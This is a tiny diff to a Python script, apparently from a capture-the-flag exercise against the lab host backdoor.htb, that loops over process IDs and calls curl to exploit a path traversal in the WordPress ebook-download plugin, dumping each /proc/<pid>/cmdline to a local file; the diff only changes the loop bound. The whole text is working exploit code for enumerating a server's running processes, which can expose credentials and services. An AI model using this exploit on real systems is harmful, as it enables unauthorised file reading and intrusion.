@@ -12,7 +12,7 @@ import os
 
 proc = 1
 
-while proc < 2000:
+while proc <= 2000:
 
     os.system("curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/" + str(proc) + "/cmdline > proc_" + str(proc) + ".txt")
 
